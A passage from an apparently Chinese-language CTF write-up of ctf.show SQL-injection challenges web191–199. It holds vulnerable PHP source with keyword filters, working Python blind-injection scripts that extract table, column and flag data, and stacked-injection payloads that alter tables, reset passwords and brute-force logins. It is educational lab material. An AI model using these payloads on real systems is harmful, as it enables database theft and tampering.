class="built_in">print</span>(<span class="string">f&quot;\r[*] trying: <span class="subst">&#123;result + char&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_char(index, char):</span><br><span class="line">            result += char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用了二分法 dejavu~~~</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c9b03201-bcdf-42ce-ac5b-c546603c1848.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 CtFsHOw&#123;FL0G,CtFsHOw&#123;usEr</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># 列名 ID,F1AG,ID,usErNAME,pAss</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">chr</span>(p)),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> true_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，过滤正则表达式新增 <code>ord hex</code>，对上一题的脚本没有影响，一把梭。    </p>
<h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex|substr/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，过滤正则表达式新增 <code>substr</code>，改用 <code>mid</code> 即可。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://308c24b8-b4a7-4ad5-a2b9-42804d696718.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow&#123;flxg,ctfshow&#123;user</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># 列名 id,f1ag,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(mid((select f1ag from ctfshow_flxg),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">chr</span>(p)),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> true_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end).lower() <span class="comment"># 部分字母变成了大写 _ 变成了 &#123; 暂时还不知道什么原因 但可以肯定跟没用 ascii() 有关</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex|substr|char|left|right|substring/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，过滤正则表达式新增 <code>char left right substring</code>，对上一题的脚本没有影响，一把梭。    </p>
<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的数字型注入，没有过滤分号可堆叠注入，过滤正则表达式没有禁用 <code>; update set =</code>，利用堆叠注入更改密码为 10086。用户名处填写<br>payload: <code>0;update`ctfshow_user`set`pass`=0x3130303836</code> ，没有用到空格。<br>登录得到 flag。    </p>
<h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不能超过16个字符&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的数字型注入，给出的过滤正则表达式变得不可信，明明有 select 但还是可以用的，利用堆叠注入绕过密码。<br>payload: <code>1;select(1)</code> 密码 1</p>
<h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的数字型注入，没有过滤分号可堆叠注入。没有禁用 <code>空格 alter table change column</code>，id 相比 password 具有递增规律更容易爆破，互换 id 和 password 列名爆破。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5b75f519-f196-427c-bbb1-6841984ef093.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alter_table</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;0;alter table ctfshow_user change column pass tmp varchar(255);alter table ctfshow_user change &quot;</span></span><br><span class="line">                    <span class="string">&quot;column id pass varchar(255);alter table ctfshow_user change column tmp id varchar(255)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    _ = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success_flag = <span class="string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_admin</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;0x<span class="subst">&#123;<span class="string">&#x27;admin&#x27;</span>.encode().<span class="built_in">hex</span>()&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> success_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] msg: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] change column id to pass&quot;</span>)</span><br><span class="line">    alter_table()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] brute force admin password&quot;</span>)</span><br><span class="line">    brute_force_admin()</span><br></pre></td></tr></table></figure>
<p>这题脚本搞了一阵才跑通，最后发现是“登陆”写成了“登录”，尴尬。。。    </p>
<h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的数字型注入，没有过滤分号可堆叠注入，没有禁用 alter，上一题脚本一把梭。    </p>
<h2 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的数字型注入，没有过滤分号可堆叠注入。<br>正则禁用了括号，password 改用 text 类型，id 改用 int 类型    </p>
